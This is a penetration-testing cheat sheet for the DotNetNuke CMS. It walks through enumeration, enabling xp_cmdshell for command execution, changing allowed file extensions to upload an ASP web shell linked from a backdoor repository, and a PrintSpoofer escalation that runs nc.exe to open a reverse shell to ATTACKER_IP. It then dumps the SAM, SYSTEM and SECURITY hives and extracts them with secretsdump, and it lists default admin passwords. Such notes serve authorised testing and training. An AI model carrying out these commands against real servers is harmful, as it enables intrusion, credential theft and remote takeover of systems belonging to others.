# DotNetNuke (DNN)

## Discovery

```bash
# Identify DNN from HTTP response
proxychains curl http://TARGET | grep -i "DNN\|DotNetNuke"

# Login page
http://TARGET/Login?returnurl=%2fadmin

# Default admin login
http://TARGET/Login?returnurl=%2fadmin
```

- DNN is a .NET-based CMS (the "WordPress of .NET")
- Default install page says "Every journey begins with the first step"
- User registration may be available but usually requires admin approval

---

## Enumeration

```bash
# Check version
curl -s http://TARGET | grep -i "dnn\|dotnetnuke"

# Common paths
/Login
/admin
/Host
/Portals/0/
/DesktopModules/
```

---

## Exploitation (Authenticated as Admin)

### RCE via SQL Console

DNN has a built-in SQL console under the **Settings** page. Enable `xp_cmdshell` to execute OS commands:

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Execute commands:

```sql
xp_cmdshell 'whoami'
xp_cmdshell 'hostname'
xp_cmdshell 'ipconfig'
```

### RCE via File Upload (ASP/ASPX Web Shell)

1. Browse to `Settings → Security → More → More Security Settings`
2. Under **Allowable File Extensions**, add `asp` and `aspx`
3. Click **Save**
4. Navigate to `http://TARGET/admin/file-management`
5. Upload an [ASP web shell](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp)
6. Right-click uploaded file → **Get URL**
7. Access the URL to execute commands

To transfer tools (e.g., PrintSpoofer, nc.exe), add `.exe` to allowable extensions, then upload via File Management. Uploaded files land in `c:\DotNetNuke\Portals\0\`.

### Reverse Shell via PrintSpoofer

If the DNN app pool runs with `SeImpersonatePrivilege`:

```cmd
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe ATTACKER_IP 443 -e cmd"
```

---

## Post-Exploitation

### Dump SAM Database

```cmd
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

Add `.SAVE` to allowable file extensions, download via File Management, then extract:

```bash
secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
```

### Download Files via DNN

Add the target file extension (e.g., `.SAVE`, `.exe`) to **Allowable File Extensions**, then browse to File Management and download.

---

## Default Credentials

| Username | Password |
|----------|----------|
| host | dnnhost |
| admin | dnnadmin |

---

## Key Paths

| Path | Description |
|------|-------------|
| `c:\DotNetNuke\Portals\0\` | Default upload directory |
| `web.config` | Database credentials, connection strings |
| `/DesktopModules/` | Installed modules |
| `/Portals/` | Site content and uploads |
